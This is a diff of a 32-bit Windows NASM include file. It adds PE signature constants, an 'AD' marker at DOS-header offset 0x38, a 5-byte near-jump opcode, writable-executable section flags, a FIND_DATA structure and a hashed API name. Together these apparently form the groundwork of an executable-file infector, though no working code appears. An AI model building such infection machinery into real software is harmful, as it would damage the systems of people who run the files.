@@ -1,6 +1,25 @@
-%define DEBUG           0
+%define DEBUG       0
 
-NULL    equ             0
+NULL            equ 0
+
+; markers
+ZM              equ 0x5A4D
+AD              equ 0x4144
+AD_OFFSET       equ 0x38
+EP              equ 0x4550
+
+; machine types
+INTEL386        equ 0x014C
+
+; instruction opcodes
+JMP_NR          equ 0xE9
+JMP_NR_BYTES    equ 5
+
+; segment characteristics
+CODE            equ 0x00000020
+EXECUTABLE      equ 0x20000000
+READABLE        equ 0x40000000
+WRITABLE        equ 0x80000000
 
 extern  _ExitProcess@4
 
@@ -91,11 +110,12 @@ extern  _ExitProcess@4
 %endmacro
 
 struc OVERLAPPED
-    internal:           resd 1
-    internalHigh:       resd 1
-    offset:             resd 1
-    offsetHigh:         resd 1
-    handle:             resd 1
+    .internal:           resd 1
+    .internalHigh:       resd 1
+    .offset:             resd 1
+    .offsetHigh:         resd 1
+    .handle:             resd 1
+    .size:
 endstruc
 
 struc SYSTEMTIME 
@@ -187,6 +207,23 @@ struc SECTIONH
     .NumberOfLinenumbers:   resw   1   ; 0x22
     .Characteristics:       resd   1   ; 0x24
     .size:                             ; = 0x28
+endstruc
+
+struc FIND_DATA
+   .dwFileAttributes:       resd   1   ; 0x00
+   .ftCreationTimeL:        resd   1   ; 0x04
+   .ftCreationTimeH:        resd   1   ; 0x08
+   .ftLastAccessTimeL:      resd   1   ; 0x0C
+   .ftLastAccessTimeH:      resd   1   ; 0x10
+   .ftLastWriteTimeL:       resd   1   ; 0x14
+   .ftLastWriteTimeH:       resd   1   ; 0x18
+   .nFileSizeHigh:          resd   1   ; 0x1C
+   .nFileSizeLow:           resd   1   ; 0x20
+   .dwReserved0:            resd   1   ; 0x24
+   .dwReserved1:            resd   1   ; 0x28
+   .cFileName:              resb   520 ; 0x2C
+   .cAlternateFileName:     resb   28  ; 0x234
+   .size:                              ; = 0x250
 endstruc
 
 AcquireSRWLockExclusiveHash equ 0x5ca43371
